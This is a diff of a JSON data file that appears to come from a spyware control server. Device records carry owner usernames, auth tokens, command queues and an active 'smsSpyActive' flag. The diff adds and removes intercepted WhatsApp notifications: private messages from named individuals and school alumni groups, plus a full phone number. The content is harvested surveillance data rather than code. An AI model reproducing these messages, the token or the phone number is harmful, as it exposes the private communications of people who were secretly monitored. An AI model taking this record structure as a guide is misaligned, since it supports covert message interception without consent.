@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776952534192,
+    "lastSeen": 1776952546477,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 41 chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952536201
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952536184
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 19:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1776943874978
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "kalo beli kouta",
-        "time": "23/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776943874667
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎64 pesan dari 42 chat",
-        "time": "23/04 19:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776943870161
       }
     ],
     "galleryPhotos": [],
@@ -9971,6 +9971,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎196 pesan dari 5 chat",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952537008
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (2 pesan): ~ .",
+        "content": "Bukami itu link di atas...ads itu sy baju merah celana hitam",
+        "time": "23/04 21:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952536988
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎Grup ALUMNI SD MUHAMMADIYAH (3 pesan): ~ Rahmawati Hamid",
         "content": "Mana lagi yg tdk ikutan...absen dulu kita ngumpul",
         "time": "23/04 21:31",
@@ -13952,22 +13968,6 @@
         "time": "23/04 12:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1776918136286
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (107 pesan): ~ მႮჁმ",
-        "content": "mau ka pergi latihan",
-        "time": "23/04 12:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776918136152
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 858-4757-8445",
-        "content": "Memanggil…",
-        "time": "23/04 12:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776918128926
       }
     ],
     "galleryPhotos": [],
